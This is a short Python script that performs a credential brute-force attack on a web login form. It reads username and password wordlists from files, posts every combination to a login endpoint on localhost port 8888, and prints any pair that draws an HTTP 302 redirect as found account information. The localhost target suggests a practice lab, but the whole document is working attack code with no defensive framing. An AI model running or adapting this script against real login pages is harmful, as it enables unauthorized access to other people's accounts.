import requests

# CONFIGURE LISTS FROM USERNAMES AND PASSWORDS
with open("lists/users.txt", "r") as userfile:
    user_list = [line.rstrip() for line in userfile]

with open("lists/pass.txt", "r") as passfile:
    pass_list = [line.rstrip() for line in passfile]

# DECLARE STANDARD REQUEST INFO TO USE
url = "http://127.0.0.1:8888/login"
headers = { "Content-Type": "application/x-www-form-urlencoded" }

# PERFORM WEB BRUTEFORCE WITH PYTHON
for i, j in [(i,j) for i in user_list for j in pass_list]:
    data = ("username={user}&password={passwd}").format(user=i, passwd=j)
    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
    
    if response.status_code == 302:
        print("Found account information - " + i + ":" + j)
        break
    else:
        print("Incorrect username and/or password - " + i + ":" + j + " | status code - " + str(response.status_code))
        continue
